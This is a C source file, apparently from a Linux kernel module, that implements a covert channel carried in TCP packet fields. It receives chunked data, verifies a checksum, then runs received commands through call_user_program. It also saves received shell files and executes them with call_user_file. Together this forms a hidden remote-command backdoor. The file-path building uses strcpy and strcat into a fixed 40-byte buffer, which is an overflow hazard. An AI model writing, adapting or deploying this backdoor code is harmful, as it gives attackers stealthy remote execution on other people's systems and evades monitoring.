#include "handle.h"

int send_data(unsigned int ip, unsigned short *buf, int size, unsigned int seq)
{
    int state;
    Data *pd = find_data(&send_map, ip);
    if (!pd) return -1;

    if (seq == pd->lastseq)
    {
        *buf = pd->lastsnd;
        return 0;
    }
    state = get_sstate(pd);
    switch (state)
    {
        case _NULL: return 0;
        case _FINI:
            return 0;

        //Send content
        case _SEND: 
            get_content(pd, buf, size);
            if (pd->cont_pos == pd->size)
            {
                set_sstate(pd, _CHEK);
            }
            break;
        case _WAIT:
            *buf = 0x0100 + pd->type;
            print_data(pd);
            if (pd->type == TP_ACKN)
            {
                del_data(&send_map, ip);
            }
            else if (pd->type == TP_RESD)
            {
                del_data(&send_map, ip);
            }
            else
            {
                set_sstate(pd, _WAIT2);
            }
            break;
        case _WAIT2:
            *buf = 0x8000 + pd->size;
            set_sstate(pd, _SEND);
            break;
        case _CHEK:
            {
                unsigned short chksum = check_chk(pd);
                memcpy(buf, &chksum, sizeof(chksum));
                set_sstate(pd, _FINI);
                /* del_data(&send_map, ip); */
                break;
            }
    }
    pd->lastseq = seq;
    pd->lastsnd = *buf;
    /* printk(KERN_INFO "Seq: %u, *urg: %c%c\n", ntohl(tcph->seq), tcph->urg_ptr & 0xff, tcph->urg_ptr >> 8); */
    return 0;
}

void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned int seq)
{
    int state;
    Data *pd;

    if (*buf >> 8 == 0x1)
    {
        switch (*buf & 0xff)
        {
        case TP_ACKN:
            del_data(&send_map, ip);
            break;
        case TP_RESD:
            pd = find_data(&send_map, ip);
            if (pd)
            {
                set_sstate(pd, _WAIT);
                pd->cont_pos = 0;
                printk(KERN_INFO "Resend.\n");
            }
            break;
        default:
            pd = find_data(&recv_map, ip);
            if (pd)
            {
                del_data(&recv_map, ip);
            }
            pd = append_data(&recv_map, ip, 0);
            pd->type = *buf & 0xff;
            break;
        }
        return;
    }

    pd = find_data(&recv_map, ip);
    if (!pd) return;

    if (seq == pd->lastseq)
    {
        return;
    }
    pd->lastseq = seq;
    state = get_rstate(pd);
    switch (state)
    {
        case _NULL: break;
        case _WAIT:
            resize_data(pd, *buf & 0x7fff);
            printk("size = %d\n", *buf & 0x7fff);
            set_rstate(pd, _RECV);
            break;
        case _RECV:
            add_content(pd, buf, size);
            /* printk(KERN_CONT "%c%c", *buf & 0xff, *buf >> 8); */
            if (pd->cont_pos == pd->size)
            {
                set_rstate(pd, _CHEK);
            }
            break;
        case _CHEK:
            {
                unsigned short chksum;
                chksum = check_chk(pd);
                if (!memcmp(&chksum, buf, sizeof(chksum)))
                {
                    printk(KERN_INFO "Recived data:\n");
                    print_data(pd);
                    /* info("Checksum correct!\n"); */
                    switch (pd->type)
                    {
                        case TP_ACKN: break;
                        case TP_COMD: call_user_program(pd->content, ip); break;
                        case TP_SHFL: 
                        {
                            char fpath[40];
                            char ipstr[20];
                            struct file *fp;
                            ipnAddrToStr(ipstr, ip);
                            strcpy(fpath, SHFILEPATH);
                            strcat(fpath, ipstr);
                            /* fp = filp_open(SHFILEPATH, O_DIRECTORY | O_CREAT, 0644); */
                            /* if (IS_ERR(fp)) */
                            /* { */
                                /* printk(KERN_ERR "Failed to create directory."); */
                                /* break; */
                            /* } */
                            /* filp_close(fp, NULL); */
                            fp = filp_open(SHFILEPATH, O_DIRECTORY, S_IRUSR);
                            if (IS_ERR(fp))
                            {
                                char *argv[] = {"/bin/mkdir", SHFILEPATH, NULL};
                                static char *envp[] = {
                                    "HOME=/",
                                    "TERM=linux",
                                    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL 
                                };

                                call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
                            }
                            else
                            {
                                filp_close(fp, NULL);
                            }
                            save_to_file_q(fpath, pd);
                            call_user_file(fpath, ip);
                            break;
                        }
                        case TP_DATA: save_to_file(SAVEFILE, pd); break;
                    }
                    
                    del_data(&recv_map, ip);

                    pd = append_data(&send_map, ip, 0);
                    set_type(pd, TP_ACKN);
                    
                    break;
                }
                info("Checksum incorrect!\n");
                print_data(pd);
                del_data(&recv_map, ip);

                pd = append_data(&send_map, ip, 0);
                set_type(pd, TP_RESD);
                break;
            }
    }
}

